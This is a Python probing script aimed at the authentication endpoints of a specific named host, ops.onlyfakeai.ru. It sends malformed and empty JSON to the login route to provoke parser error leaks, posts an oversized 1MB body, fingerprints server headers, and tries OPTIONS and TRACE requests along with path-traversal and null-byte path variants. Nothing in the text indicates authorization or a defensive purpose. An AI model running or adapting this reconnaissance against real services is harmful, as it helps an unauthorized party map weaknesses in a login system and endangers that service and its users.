import ssl, json, urllib.request, urllib.error

ctx = ssl.create_default_context()
OPS = "https://ops.onlyfakeai.ru"

def raw_req(method, url, body=None, ctype=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if ctype:
        h["Content-Type"] = ctype
    if extra:
        h.update(extra)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

print("=== 1. broken JSON body to login (express parser error leak) ===")
st, hd, b = raw_req("POST", OPS + "/api/auth/login", b'{"email": "x", ', ctype="application/json")
print(st, b[:500])

print("\n=== 2. empty body ===")
st, hd, b = raw_req("POST", OPS + "/api/auth/login", b"", ctype="application/json")
print(st, b[:300])

print("\n=== 3. huge body (1MB) ===")
st, hd, b = raw_req("POST", OPS + "/api/auth/login", b"x" * 1048576, ctype="application/json")
print(st, b[:300])

print("\n=== 4. OPTIONS on verify ===")
st, hd, b = raw_req("OPTIONS", OPS + "/api/auth/verify")
print(st, {k: v for k, v in hd.items() if "allow" in k.lower() or "access" in k.lower()}, b[:150])

print("\n=== 5. HEAD /health ===")
st, hd, b = raw_req("HEAD", OPS + "/health")
print(st, {k: v for k, v in hd.items() if k.lower() in ("x-powered-by", "server", "via")})

print("\n=== 6. GET / with weird paths (express route 404 details) ===")
for p in ["/api/auth/login/..", "/api/auth/login%00", "/api/auth/login?x=1",
          "/api//auth//login", "/API/AUTH/LOGIN"]:
    st, hd, b = raw_req("GET", OPS + p)
    print(p, "->", st, b[:120].decode("utf-8", "ignore")[:100])

print("\n=== 7. TRACE method ===")
st, hd, b = raw_req("TRACE", OPS + "/api/auth/verify")
print(st, b[:200])
